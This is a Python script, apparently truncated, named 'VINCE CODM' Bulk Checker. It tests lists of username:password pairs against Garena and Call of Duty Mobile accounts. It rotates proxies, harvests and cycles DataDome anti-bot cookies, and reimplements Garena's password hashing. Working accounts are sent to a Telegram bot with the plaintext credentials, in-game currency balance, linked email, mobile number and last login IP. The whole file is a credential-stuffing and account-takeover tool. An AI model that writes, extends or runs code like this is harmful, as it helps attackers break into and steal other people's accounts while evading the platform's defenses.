#!/usr/bin/env python3
"""
VINCE CODM - Bulk Checker Only
Standalone script for bulk checking Garena/CODM accounts
"""

import hashlib
import json
import logging
import threading
import random
import os
import re
import sys
import time
import urllib.parse
import math
import uuid
import subprocess
import platform
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from threading import Lock, Event, local
from collections import deque
import signal

print_lock = Lock()
import colorama
import requests
from Crypto.Cipher import AES

# Telegram imports
try:
    import telegram
    from telegram import Bot
    from telegram.error import TelegramError
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False

colorama.init(autoreset=True)

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box
from rich.live import Live
from rich.text import Text
from rich.align import Align
from rich.columns import Columns
from rich.console import Group

console = Console()

RED = '\033[38;2;255;0;85m'
GREEN = '\033[38;2;57;255;20m'
CYAN = '\033[38;2;0;255;255m'
YELLOW = '\033[38;2;255;255;0m'
MAGENTA = '\033[38;2;218;112;214m'
BLUE = '\033[38;2;0;150;255m'
WHITE = '\033[38;2;248;248;255m'
ORANGE = '\033[38;2;255;165;0m'
BRIGHT_BLACK = '\033[38;2;105;105;105m'
GRAY = '\033[38;2;128;128;128m'
RESET = '\033[0m'

FILE_LOCK = Lock()
_SCRIPT_DIR_COOKIE = os.path.dirname(os.path.abspath(__file__))

CODM_REGIONS = {
    'PH': {'name': 'Philippines', 'code': '63', 'flag': '🇵🇭'},
    'ID': {'name': 'Indonesia', 'code': '62', 'flag': '🇮🇩'},
    'HK': {'name': 'Hong Kong', 'code': '852', 'flag': '🇭🇰'},
    'MY': {'name': 'Malaysia', 'code': '60', 'flag': '🇲🇾'},
    'TW': {'name': 'Taiwan', 'code': '886', 'flag': '🇹🇼'},
    'TH': {'name': 'Thailand', 'code': '66', 'flag': '🇹🇭'},
    'SG': {'name': 'Singapore', 'code': '65', 'flag': '🇸🇬'},
    'VN': {'name': 'Vietnam', 'code': '84', 'flag': '🇻🇳'},
    'MM': {'name': 'Myanmar', 'code': '95', 'flag': '🇲🇲'},
    'KH': {'name': 'Cambodia', 'code': '855', 'flag': '🇰🇭'},
    'LA': {'name': 'Laos', 'code': '856', 'flag': '🇱🇦'},
    'BN': {'name': 'Brunei', 'code': '673', 'flag': '🇧🇳'}
}

DEFAULT_THREADS = 5
CHECK_OTHER_GAMES = False

GAME_FILE_MAP = {
    'CODM': 'CODM.txt',
    'FREEFIRE': 'FreeFire.txt',
    'FREE FIRE': 'FreeFire.txt',
    'ROV': 'ROV.txt',
    'DELTA FORCE': 'DeltaForce.txt',
    'AOV': 'AOV.txt',
    'SPEED DRIFTERS': 'SpeedDrifters.txt',
    'BLACK CLOVER M': 'BlackCloverM.txt',
    'GARENA UNDAWN': 'Undawn.txt',
    'FC ONLINE': 'FCOnline.txt',
    'FC ONLINE M': 'FCOnlineM.txt',
    'MOONLIGHT BLADE': 'MoonlightBlade.txt',
    'FAST THRILL': 'FastThrill.txt',
    'THE WORLD OF WAR': 'WorldOfWar.txt'
}

OAUTH_MAX_RETRIES = 3
OAUTH_RETRY_DELAY = 2

# ============ TELEGRAM CONFIGURATION ============
TELEGRAM_BOT_TOKEN = None
TELEGRAM_CHAT_ID = None
TELEGRAM_ENABLED = False
TELEGRAM_CONFIG_FILE = 'telegram_config.txt'

def save_telegram_config(token, chat_id):
    """Save Telegram configuration to file"""
    try:
        with open(TELEGRAM_CONFIG_FILE, 'w') as f:
            f.write(f"BOT_TOKEN={token}\n")
            f.write(f"CHAT_ID={chat_id}\n")
        return True
    except Exception as e:
        return False

def load_telegram_config():
    """Load Telegram configuration from file"""
    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TELEGRAM_ENABLED
    
    if os.path.exists(TELEGRAM_CONFIG_FILE):
        try:
            with open(TELEGRAM_CONFIG_FILE, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line.startswith('BOT_TOKEN='):
                        TELEGRAM_BOT_TOKEN = line.split('=', 1)[1].strip()
                    elif line.startswith('CHAT_ID='):
                        TELEGRAM_CHAT_ID = line.split('=', 1)[1].strip()
            
            if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID and TELEGRAM_AVAILABLE:
                TELEGRAM_ENABLED = True
                return True
            else:
                TELEGRAM_ENABLED = False
                return False
        except:
            TELEGRAM_ENABLED = False
            return False
    return False

def setup_telegram_prompt():
    """Prompt user for Telegram configuration"""
    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TELEGRAM_ENABLED
    
    console.print()
    console.print(Panel(
        "[yellow]TELEGRAM NOTIFICATIONS[/yellow]\n"
        "[white]Send clean account hits to Telegram[/white]",
        title="[bold cyan]TELEGRAM SETUP[/bold cyan]",
        border_style="cyan",
        box=box.ROUNDED,
        padding=(1, 2)
    ))
    console.print()
    
    # Check if already configured
    if load_telegram_config():
        console.print(f"[green]✓ Telegram already configured![/green]")
        console.print(f"[cyan]Bot Token:[/cyan] {TELEGRAM_BOT_TOKEN[:10]}...")
        console.print(f"[cyan]Chat ID:[/cyan] {TELEGRAM_CHAT_ID}")
        console.print()
        
        choice = console.input("[yellow]Do you want to keep existing config? (y/n): [/yellow]").strip().lower()
        if choice == 'y':
            TELEGRAM_ENABLED = True
            _log('SUCCESS', 'Telegram notifications enabled!')
            return True
    
    console.print("[cyan]How to set up Telegram notifications:[/cyan]")
    console.print("1. Create a bot on Telegram: [yellow]@BotFather[/yellow]")
    console.print("2. Get your bot token from @BotFather")
    console.print("3. Get your chat ID by sending a message to your bot")
    console.print("4. Check chat ID at: [yellow]https://api.telegram.org/bot<TOKEN>/getUpdates[/yellow]")
    console.print()
    
    # Get bot token
    while True:
        token = console.input("[cyan]Enter Bot Token (or press Enter to skip): [/cyan]").strip()
        if not token:
            console.print("[yellow]⚠ Telegram notifications disabled.[/yellow]")
            TELEGRAM_ENABLED = False
            return False
        if len(token) > 20:  # Basic validation
            break
        console.print("[red]❌ Invalid token format. Please try again.[/red]")
    
    # Get chat ID
    while True:
        chat_id = console.input("[cyan]Enter Chat ID (or press Enter to skip): [/cyan]").strip()
        if not chat_id:
            console.print("[yellow]⚠ Telegram notifications disabled.[/yellow]")
            TELEGRAM_ENABLED = False
            return False
        if chat_id.isdigit() or chat_id.startswith('-'):
            break
        console.print("[red]❌ Invalid chat ID. Please try again.[/red]")
    
    # Test the connection
    console.print("[yellow]Testing Telegram connection...[/yellow]")
    try:
        test_bot = Bot(token=token)
        test_bot.send_message(chat_id=chat_id, text="🚀 *VINCE CODM Checker Connected!*\n\nClean accounts will be sent here.", parse_mode='MARKDOWN')
        console.print("[green]✓ Test message sent successfully![/green]")
        
        # Save config
        if save_telegram_config(token, chat_id):
            TELEGRAM_BOT_TOKEN = token
            TELEGRAM_CHAT_ID = chat_id
            TELEGRAM_ENABLED = True
            console.print("[green]✓ Configuration saved to telegram_config.txt[/green]")
            return True
        else:
            console.print("[red]❌ Failed to save configuration.[/red]")
            return False
            
    except Exception as e:
        console.print(f"[red]❌ Failed to send test message: {e}[/red]")
        console.print("[yellow]Make sure your bot token and chat ID are correct.[/yellow]")
        
        retry = console.input("[yellow]Try again? (y/n): [/yellow]").strip().lower()
        if retry == 'y':
            return setup_telegram_prompt()
        else:
            TELEGRAM_ENABLED = False
            return False

def send_telegram_clean_hit(account_data):
    """Send clean account information to Telegram"""
    if not TELEGRAM_ENABLED or not TELEGRAM_AVAILABLE:
        return False
    
    try:
        bot = Bot(token=TELEGRAM_BOT_TOKEN)
        
        # Format the message with clean account details
        username = account_data.get('username', account_data.get('account', 'N/A'))
        password = account_data.get('password', 'N/A')
        codm_level = account_data.get('codm_level', 0)
        shell = account_data.get('shell_balance', 0)
        country = account_data.get('country', 'N/A')
        region = account_data.get('codm_region', 'N/A')
        codm_nickname = account_data.get('codm_nickname', 'N/A')
        uid = account_data.get('uid', 'N/A')
        codm_uid = account_data.get('codm_uid', 'N/A')
        email = account_data.get('email_display', account_data.get('email', 'N/A'))
        mobile = account_data.get('formatted_mobile', 'N/A')
        fb_info = account_data.get('fb_info', 'N/A')
        account_status = account_data.get('account_status', 'N/A')
        shell_balance = account_data.get('shell_balance', 0)
        last_login = account_data.get('last_login_date', 'N/A')
        last_ip = account_data.get('last_login_ip', 'N/A')
        
        # Build clean account message
        message = f"""
🎯 *CLEAN ACCOUNT FOUND!* 🎯

📱 *Account:* `{username}:{password}`

━━━━━━━━━━━━━━━━━━━━━━

🎮 *CODM INFO:*
├ Level: *{codm_level}*
├ Nickname: *{codm_nickname}*
├ UID: `{codm_uid}`
├ Region: *{region}*
└ Country: *{country}*

💰 *Shell Balance:* *{shell_balance}*

🔐 *Security:*
├ Email: *{email}*
├ Mobile: *{mobile}*
├ Facebook: *{fb_info}*
└ Status: *{account_status}*

📅 *Last Login:* *{last_login}*
🌐 *Last IP:* *{last_ip}*

━━━━━━━━━━━━━━━━━━━━━━
🔹 *Powered by VINCE CODM*
"""
        
        # Send the message
        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message, parse_mode='MARKDOWN')
        return True
        
    except Exception as e:
        _log('ERROR', f'Failed to send Telegram message: {str(e)}')
        return False

# ============ UTILITY FUNCTIONS ============

def _ts():
    return datetime.now().strftime('%H:%M:%S')

def _log(level: str, msg: str, indent: str = '  '):
    log_icons = {
        'INFO': (CYAN, 'ℹ'),
        'SUCCESS': (GREEN, '✔'),
        'WARNING': (YELLOW, '⚠'),
        'ERROR': (RED, '✖'),
        'DEBUG': (GRAY, '·'),
        'SAVE': (GREEN, '⬇')
    }
    col, icon = log_icons.get(level, (GRAY, '·'))
    ts = _ts()
    clean = re.sub(r'\x1B\[[0-?]*[ -/]*[@-~]', '', str(msg))
    print(f'{indent}{GRAY}[{ts}]{RESET}  {col}{icon}{RESET}  {clean}')

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def sanitize_string(text):
    if not text or text == 'N/A':
        return text
    try:
        return text.encode('ascii', errors='ignore').decode('ascii')
    except:
        return re.sub('[^\\x00-\\x7F]+', '', str(text))

def clean_account_line(line):
    if not line:
        return (None, None)
    line = line.strip().lstrip('\ufeff\ufffe')
    line = ''.join((char for char in line if char.isprintable() or char == ':'))
    if ':' not in line:
        return (None, None)
    try:
        parts = line.split(':', 1)
        if len(parts) != 2:
            return (None, None)
        account = parts[0].strip()
        password = parts[1].strip()
        account = sanitize_string(account)
        password = sanitize_string(password)
        if not account or not password:
            return (None, None)
        return (account, password)
    except:
        return (None, None)

def format_size(size_bytes):
    if size_bytes == 0:
        return "0B"
    size_name = ("B", "KB", "MB", "GB", "TB")
    i = int(math.floor(math.log(size_bytes, 1024)))
    p = math.pow(1024, i)
    s = round(size_bytes / p, 2)
    return f"{s}{size_name[i]}"

def _strip_rich(text):
    return re.sub('\\[/?[^\\]]+\\]', '', str(text))

def format_mobile_number(mobile_no, country_code=None):
    if not mobile_no or mobile_no == 'N/A' or (not str(mobile_no).strip()):
        return 'N/A'
    mobile_str = str(mobile_no).strip()
    mobile_str = mobile_str.replace('+', '').replace(' ', '').replace('-', '')
    if country_code:
        country_code = str(country_code).strip()
        if not mobile_str.startswith(country_code):
            if mobile_str.startswith('0'):
                mobile_str = country_code + mobile_str[1:]
            else:
                mobile_str = country_code + mobile_str
    detected_country_code = None
    for code_key, region_info in CODM_REGIONS.items():
        code = region_info['code']
        if mobile_str.startswith(code):
            detected_country_code = code
            break
    if detected_country_code:
        local_number = mobile_str[len(detected_country_code):]
        if len(local_number) >= 4:
            masked = '*' * (len(local_number) - 4) + local_number[-4:]
            return f'+{detected_country_code} {masked}'
        else:
            return f'+{detected_country_code} {local_number}'
    elif len(mobile_str) >= 4:
        masked = '*' * (len(mobile_str) - 4) + mobile_str[-4:]
        return f'+{masked}'
    else:
        return mobile_str

def get_flag(code):
    try:
        return "".join(chr(ord(c) + 127397) for c in str(code).upper())
    except:
        return ""

def format_codm_region(region_code):
    if not region_code or region_code == 'N/A':
        return 'N/A'
    region_code = region_code.upper()
    region_info = CODM_REGIONS.get(region_code)
    if region_info:
        return f"{region_info['flag']} {region_info['name']} ({region_code})"
    else:
        return f'{region_code}'

# ============ SIGNAL HANDLER ============

def _sigint_handler(sig, frame):
    print(f'\n  {YELLOW}⚠  Ctrl+C – exiting immediately…{RESET}')
    os._exit(0)

signal.signal(signal.SIGINT, _sigint_handler)

# ============ DISPLAY FUNCTIONS ============

def display_banner():
    clear_screen()
    console = Console()

    logo = r"""
 ██████╗ ██████╗ ██████╗ ███╗   ███╗
██╔════╝██╔═══██╗██╔══██╗████╗ ████║
██║     ██║   ██║██║  ██║██╔████╔██║
██║     ██║   ██║██║  ██║██║╚██╔╝██║
╚██████╗╚██████╔╝██████╔╝██║ ╚═╝ ██║
 ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝
"""

    logo_text = Text(logo, style="bold red")

    title = (
        Text(" CODM\n", style="bold red")
        + Text("CALL OF DUTY MOBILE", style="bold cyan")
    )

    header = Panel(
        Align.center(title),
        border_style="red",
        padding=(1, 5)
    )

    def get_prop(prop):
        try:
            return subprocess.check_output(
                ["getprop", prop],
                text=True,
                stderr=subprocess.DEVNULL
            ).strip() or "Unknown"
        except:
            return "Unknown"

    try:
        brand = get_prop("ro.product.brand").upper()
        model = get_prop("ro.product.model")
        dev_name = get_prop("ro.product.marketname")

        dev_name = dev_name if dev_name != "Unknown" else model

        chipset = get_prop("ro.board.platform")
        chipset = chipset if chipset != "Unknown" else get_prop("ro.hardware")

        android_ver = get_prop("ro.build.version.release")
        build = get_prop("ro.build.display.id")

    except:
        dev_name = platform.node() or "Unknown"
        brand = "Unknown"
        model = "Unknown"
        chipset = platform.machine()
        android_ver = platform.release()
        build = platform.version()

    device = Table(
        box=box.ROUNDED,
        expand=True,
        border_style="cyan"
    )

    device.add_column("SYSTEM", style="bold magenta")
    device.add_column("VALUE", style="bold green")

    for key, value in [
        (" DEVICE", dev_name),
        (" BRAND", brand),
        (" MODEL", model),
        (" CHIPSET", chipset),
        (" ANDROID", android_ver),
        (" BUILD", build)
    ]:
        clean_value = re.sub(
            r'[^\x20-\x7E]',
            '',
            str(value)
        ).strip()[:40]

        device.add_row(key, clean_value)

    device_panel = Panel(
        device,
        title="[bold cyan]DEVICE INFORMATION[/bold cyan]",
        border_style="green",
        padding=(1, 2)
    )

    logo_panel = Panel(
        Align.center(logo_text),
        title="[bold red]CALL OF DUTY MOBILE[/bold red]",
        border_style="red",
        padding=(1, 2)
    )

    footer = Panel(
        Align.center(
            "[bold green]✓ SYSTEM READY[/bold green]\n"
            "[cyan]CODM VALIDATION ENGINE ONLINE[/cyan]"
        ),
        border_style="cyan",
        padding=(1, 3)
    )

    console.print(header)

    console.print(
        Columns(
            [logo_panel, device_panel],
            equal=False,
            expand=True
        )
    )

    console.print(footer)
    print()

def format_hit_simple(username, level, shell, status):
    """Clean formatted valid hit output."""
    return (
        f"➤ [bold white]{username}[/bold white] "
        f"→ [bold green]VALID[/bold green] "
        f"[cyan]LV.{level}[/cyan] "
        f"[yellow]Shell: {shell}[/yellow] "
        f"[green]{status}[/green]"
    )


def display_summary(
    total_checked,
    failed,
    valid,
    categorized_levels,
    countries,
    original_total,
    highest_clean=0,
    highest_not_clean=0,
    highest_shells=0,
    highest_clean_account=None
):
    console = Console()

    total = max(original_total, 1)

    # ─────────────────────────────────────────────
    # PROGRESS BAR
    # ─────────────────────────────────────────────
    def make_bar(label, value, color, maximum=total, width=28):
        maximum = max(maximum, 1)
        percent = min(value / maximum, 1)

        filled = int(width * percent)
        empty = width - filled

        bar = (
            f"[bold {color}]"
            + "━" * filled
            + "[/bold "
            + color
            + "]"
            + "[dim]─[/dim]" * empty
        )

        return (
            f"[bold white]{label:<14}[/bold white] "
            f"{bar} "
            f"[bold {color}]{percent * 100:5.1f}%[/bold {color}] "
            f"[dim]({value})[/dim]"
        )

    # ─────────────────────────────────────────────
    # TOP RESULT STATS
    # ─────────────────────────────────────────────
    result_group = Group(
        make_bar("VALID", valid, "green"),
        make_bar("FAILED", failed, "red"),
        make_bar("CHECKED", total_checked, "cyan"),
    )

    result_panel = Panel(
        result_group,
        title="[bold cyan]╭─ CHECKING STATUS ─╮[/bold cyan]",
        border_style="cyan",
        box=box.ROUNDED,
        padding=(1, 2),
    )

    # ─────────────────────────────────────────────
    # LEVEL DISTRIBUTION
    # ─────────────────────────────────────────────
    level_group = Group()

    levels = [
        ("LV 1-49", "1-49", "blue"),
        ("LV 50-99", "50-99", "cyan"),
        ("LV 100-199", "100-199", "green"),
        ("LV 200-299", "200-299", "yellow"),
        ("LV 300-400", "300-400", "magenta"),
    ]

    for name, key, color in levels:
        level_group.renderables.append(
            make_bar(
                name,
                categorized_levels.get(key, 0),
                color,
                total
            )
        )

    level_panel = Panel(
        level_group,
        title="[bold yellow]🏆 LEVEL DISTRIBUTION[/bold yellow]",
        border_style="yellow",
        box=box.ROUNDED,
        padding=(1, 2),
    )

    # ─────────────────────────────────────────────
    # COUNTRY DISTRIBUTION
    # ─────────────────────────────────────────────
    country_counts = {}

    for country in countries:
        clean_country = re.sub(
            r"\s*\([^)]*\)",
            "",
            str(country)
        ).strip()

        if clean_country:
            country_counts[clean_country] = (
                country_counts.get(clean_country, 0) + 1
            )

    country_group = Group()

    for country, count in sorted(
        country_counts.items(),
        key=lambda x: x[1],
        reverse=True
    )[:10]:

        country_group.renderables.append(
            make_bar(
                country[:14],
                count,
                "magenta",
                total
            )
        )

    country_panel = Panel(
        country_group,
        title="[bold magenta]🌍 TOP COUNTRIES[/bold magenta]",
        border_style="magenta",
        box=box.ROUNDED,
        padding=(1, 2),
    )

    # ─────────────────────────────────────────────
    # PEAK STATISTICS
    # ─────────────────────────────────────────────
    peak = Table(
        box=None,
        expand=True,
        show_header=False,
        padding=(0, 1),
    )

    peak.add_column("TYPE", style="bold cyan")
    peak.add_column("VALUE", justify="right")

    peak.add_row(
        "🔥 Highest Clean Level",
        f"[bold green]LV.{highest_clean}[/bold green]"
    )

    if highest_clean_account:
        peak.add_row(
            "👤 Highest Clean Account",
            f"[bold green]LV.{highest_clean}[/bold green]"
        )

    peak.add_row(
        "⚠ Highest Not Clean",
        f"[bold red]LV.{highest_not_clean}[/bold red]"
    )

    peak.add_row(
        "💰 Highest Shell",
        f"[bold yellow]{highest_shells}[/bold yellow]"
    )

    peak_panel = Panel(
        peak,
        title="[bold green]🔥 PEAK STATISTICS[/bold green]",
        border_style="green",
        box=box.ROUNDED,
        padding=(1, 2),
    )

    # ─────────────────────────────────────────────
    # FINAL HEADER
    # ─────────────────────────────────────────────
    title = Text()
    title.append("╔══════════════════════════════════════╗\n", style="bold cyan")
    title.append("       FINAL CHECKING SUMMARY\n", style="bold white")
    title.append("╚══════════════════════════════════════╝", style="bold cyan")

    console.print(
        Panel(
            Align.center(title),
            border_style="cyan",
            box=box.ROUNDED,
            padding=(0, 2),
        )
    )

    # ─────────────────────────────────────────────
    # MAIN DASHBOARD
    # ─────────────────────────────────────────────
    console.print(
        Columns(
            [result_panel, peak_panel],
            equal=True,
            expand=True,
        )
    )

    console.print(level_panel)

    if countries:
        console.print(country_panel)

    # ─────────────────────────────────────────────
    # FOOTER
    # ─────────────────────────────────────────────
    footer = (
        f"[bold green]✓ CHECK COMPLETE[/bold green]   "
        f"[cyan]Checked:[/cyan] {total_checked}   "
        f"[green]Valid:[/green] {valid}   "
        f"[red]Failed:[/red] {failed}"
    )

    console.print(
        Panel(
            Align.center(footer),
            border_style="green",
            box=box.ROUNDED,
            padding=(0, 2),
        )
    )

    print()

def build_live_stats_ui(stats):
    from rich.panel import Panel
    from rich.table import Table
    from rich.columns import Columns
    from rich.console import Group
    from rich.progress import (
        Progress,
        BarColumn,
        TextColumn,
        TimeElapsedColumn,
    )
    from rich.text import Text
    from rich import box

    # ─────────────────────────────────────────────
    # SAFE STATS READER
    # ─────────────────────────────────────────────
    def s(key, default=0):
        if isinstance(stats, dict):
            return stats.get(key, default)
        return default

    # ─────────────────────────────────────────────
    # ACCOUNTS
    # ─────────────────────────────────────────────
    account_table = Table(
        box=None,
        expand=True,
        show_header=False,
        padding=(0, 1),
    )

    account_table.add_column("STATUS", style="bold cyan")
    account_table.add_column("COUNT", justify="right")

    account_items = [
        ("VALID", "valid", "green"),
        ("INVALID", "invalid", "red"),
        ("CLEAN", "clean", "bright_green"),
        ("NOT CLEAN", "not_clean", "bright_red"),
    ]

    for label, key, color in account_items:
        account_table.add_row(
            f"● {label}",
            f"[bold {color}]{s(key)}[/bold {color}]"
        )

    checked = s("checked")
    total = s("total")

    account_table.add_row(
        "● CHECKED",
        f"[bold cyan]{checked}[/bold cyan] "
        f"[dim]/ {total}[/dim]"
    )

    account_panel = Panel(
        account_table,
        title="[bold cyan]╭─ ACCOUNTS ─╮[/bold cyan]",
        border_style="cyan",
        box=box.ROUNDED,
        padding=(1, 2),
    )

    # ─────────────────────────────────────────────
    # CODM DETAILS
    # ─────────────────────────────────────────────
    codm_table = Table(
        box=None,
        expand=True,
        show_header=False,
        padding=(0, 1),
    )

    codm_table.add_column("DETAIL", style="bold yellow")
    codm_table.add_column("VALUE", justify="right")

    codm_items = [
        ("HAS CODM", "has_codm", "cyan"),
        ("NO CODM", "no_codm", "yellow"),
        ("HIGH LEVEL", "high_lvl", "magenta"),
        ("HIGH SHELL", "high_shell", "bright_yellow"),
    ]

    for label, key, color in codm_items:
        codm_table.add_row(
            f"● {label}",
            f"[bold {color}]{s(key)}[/bold {color}]"
        )

    highest_clean_level = s("highest_clean_level")
    highest_clean_account = s("highest_clean_account")

    if highest_clean_level > 0 and highest_clean_account:
        clean_value = (
            f"[bold green]LV.{highest_clean_level}[/bold green] "
            f"[dim]({str(highest_clean_account)[:20]})[/dim]"
        )
    elif highest_clean_level > 0:
        clean_value = (
            f"[bold green]LV.{highest_clean_level}[/bold green]"
        )
    else:
        clean_value = "[yellow]NONE[/yellow]"

    codm_table.add_row(
        "● HIGHEST CLEAN",
        clean_value
    )

    elapsed = s("elapsed", 0)

    try:
        elapsed_text = f"{float(elapsed):.2f}s"
    except (TypeError, ValueError):
        elapsed_text = "0.00s"

    codm_table.add_row(
        "● TIME",
        f"[bold white]{elapsed_text}[/bold white]"
    )

    codm_panel = Panel(
        codm_table,
        title="[bold magenta]╭─ CODM DETAILS ─╮[/bold magenta]",
        border_style="magenta",
        box=box.ROUNDED,
        padding=(1, 2),
    )

    # ─────────────────────────────────────────────
    # LEVEL DISTRIBUTION
    # ─────────────────────────────────────────────
    level_table = Table(
        box=None,
        expand=True,
        padding=(0, 1),
    )

    level_table.add_column(
        "LEVEL",
        style="bold green"
    )

    level_table.add_column(
        "COUNT",
        justify="right",
        style="bold cyan"
    )

    level_dist = s("level_distribution", {})

    if not isinstance(level_dist, dict):
        level_dist = {}

    level_ranges = [
        "1-50",
        "51-100",
        "101-150",
        "151-200",
        "201-250",
        "251-300",
        "301-350",
        "351-400",
    ]

    for level_range in level_ranges:
        count = level_dist.get(level_range, 0)

        level_table.add_row(
            f"LV. {level_range}",
            str(count)
        )

    level_panel = Panel(
        level_table,
        title="[bold green]🏆 LEVEL DISTRIBUTION[/bold green]",
        border_style="green",
        box=box.ROUNDED,
        padding=(1, 2),
    )

    # ─────────────────────────────────────────────
    # REGION DISTRIBUTION
    # ─────────────────────────────────────────────
    region_dist = s("region_distribution", {})

    region_table = Table(
        box=None,
        expand=True,
        padding=(0, 1),
    )

    region_table.add_column(
        "REGION",
        style="bold yellow"
    )

    region_table.add_column(
        "COUNT",
        justify="right",
        style="bold cyan"
    )

    if isinstance(region_dist, dict) and region_dist:
        for region, count in sorted(
            region_dist.items(),
            key=lambda x: x[1],
            reverse=True
        )[:10]:

            region_table.add_row(
                str(region)[:18],
                str(count)
            )
    else:
        region_table.add_row(
            "NO DATA",
            "0"
        )

    region_panel = Panel(
        region_table,
        title="[bold yellow]🌍 REGION DISTRIBUTION[/bold yellow]",
        border_style="yellow",
        box=box.ROUNDED,
        padding=(1, 2),
    )

    # ─────────────────────────────────────────────
    # PROGRESS
    # ─────────────────────────────────────────────
    progress = Progress(
        TextColumn(
            "[bold cyan]{task.description}[/bold cyan]"
        ),
        BarColumn(
            bar_width=30
        ),
        TextColumn(
            "[bold green]{task.percentage:>5.1f}%[/bold green]"
        ),
        TextColumn(
            "[dim]{task.completed}/{task.total}[/dim]"
        ),
        TimeElapsedColumn(),
        expand=True,
    )

    progress.add_task(
        "CHECKING ACCOUNTS",
        total=max(total, 1),
        completed=min(checked, max(total, 1))
    )

    progress_panel = Panel(
        progress,
        title="[bold cyan]⚡ LIVE PROGRESS[/bold cyan]",
        border_style="cyan",
        box=box.ROUNDED,
        padding=(1, 2),
    )

    # ─────────────────────────────────────────────
    # LIVE HEADER
    # ─────────────────────────────────────────────
    header = Panel(
        Text(
            "CODM LIVE CHECKING",
            justify="center",
            style="bold white"
        ),
        border_style="cyan",
        box=box.ROUNDED,
        padding=(0, 1),
    )

    # ─────────────────────────────────────────────
    # FINAL LAYOUT
    # ─────────────────────────────────────────────
    return Group(
        header,

        Columns(
            [account_panel, codm_panel],
            equal=True,
            expand=True,
        ),

        Columns(
            [level_panel, region_panel],
            equal=True,
            expand=True,
        ),

        progress_panel,
    )

# ============ PROXY MANAGER ============

class ProxyManager:
    def __init__(self, proxy_file='proxies.txt'):
        self.proxies = []
        self._index = 0
        self._lock = threading.Lock()
        self._load(proxy_file)

    _VALID_SCHEMES = ('http', 'https', 'socks4', 'socks4a', 'socks5', 'socks5h')

    def _parse_line(self, line):
        scheme = 'http'
        rest = line
        if '://' in line:
            scheme, rest = line.split('://', 1)
            scheme = scheme.strip().lower()
            if scheme not in self._VALID_SCHEMES:
                scheme = 'http'
            if '@' in rest:
                creds, hostport = rest.rsplit('@', 1)
                user, _, passwd = creds.partition(':')
            else:
                hostport = rest
                user = passwd = None
            host, _, port = hostport.partition(':')
            if not host or not port:
                return None
        else:
            parts = rest.split(':')
            if len(parts) == 4:
                host, port, user, passwd = parts
            elif len(parts) == 2:
                host, port = parts
                user = passwd = None
            elif '@' in rest:
                try:
                    creds, hostport = rest.rsplit('@', 1)
                    user, passwd = creds.split(':', 1)
                    host, port = hostport.split(':', 1)
                except Exception:
                    return None
            else:
                return None

        if user and passwd:
            url = f'{scheme}://{urllib.parse.quote(user, safe="")}:{urllib.parse.quote(passwd, safe="")}@{host}:{port}'
        else:
            url = f'{scheme}://{host}:{port}'
        return {'http': url, 'https': url}

    def _load(self, proxy_file):
        if not os.path.exists(proxy_file):
            return
        with open(proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                proxy_dict = self._parse_line(line)
                if proxy_dict:
                    self.proxies.append(proxy_dict)
        if self.proxies:
            random.shuffle(self.proxies)

    def get_next(self):
        if not self.proxies:
            return None
        with self._lock:
            proxy = self.proxies[self._index % len(self.proxies)]
            self._index += 1
        return proxy

    def is_loaded(self):
        return len(self.proxies) > 0

# ============ COOKIE MANAGER ============

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.live_cookies = deque()
        self.lock = threading.Lock()
        self.load_banned_cookies()
        self.load_initial_cookies()

    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set((line.strip() for line in f if line.strip()))

    def load_initial_cookies(self):
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                for line in f:
                    cookie = line.strip()
                    if cookie and cookie not in self.banned_cookies:
                        self.live_cookies.append(cookie)

    def is_banned(self, cookie):
        return cookie in self.banned_cookies

    def mark_banned(self, cookie_value):
        formatted_cookie = cookie_value if 'datadome=' in cookie_value else f'datadome={cookie_value}'
        with self.lock:
            if formatted_cookie in self.live_cookies:
                self.live_cookies.remove(formatted_cookie)
            if formatted_cookie not in self.banned_cookies:
                self.banned_cookies.add(formatted_cookie)
                threading.Thread(target=self._append_to_file, args=('banned_cookies.txt', formatted_cookie), daemon=True).start()

    def get_valid_cookies(self):
        with self.lock:
            cookies = list(self.live_cookies)
            if cookies:
                random.shuffle(cookies)
            return cookies

    def save_cookie(self, datadome_value):
        if not datadome_value:
            return False
        val = datadome_value.strip()
        formatted_cookie = val if val.startswith('datadome=') else f'datadome={val}'
        with self.lock:
            if formatted_cookie not in self.banned_cookies and formatted_cookie not in self.live_cookies:
                self.live_cookies.append(formatted_cookie)
                threading.Thread(target=self._append_to_file, args=('fresh_cookie.txt', formatted_cookie), daemon=True).start()
                return True
        return False

    def _append_to_file(self, filename, content):
        try:
            with open(filename, 'a') as f:
                f.write(content + '\n')
        except Exception:
            pass

# ============ DATA DOME ============

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(';'):
        item = item.strip()
        if not item:
            continue
        if '=' in item:
            try:
                key, value = item.split('=', 1)
                cookie_dict[key.strip()] = value.strip()
            except ValueError:
                pass
    session.cookies.update(cookie_dict)

def init_ga_cookies(session):
    timestamp = int(time.time())
    random_id = random.randint(1000000000, 9999999999)
    ga_cookies = {
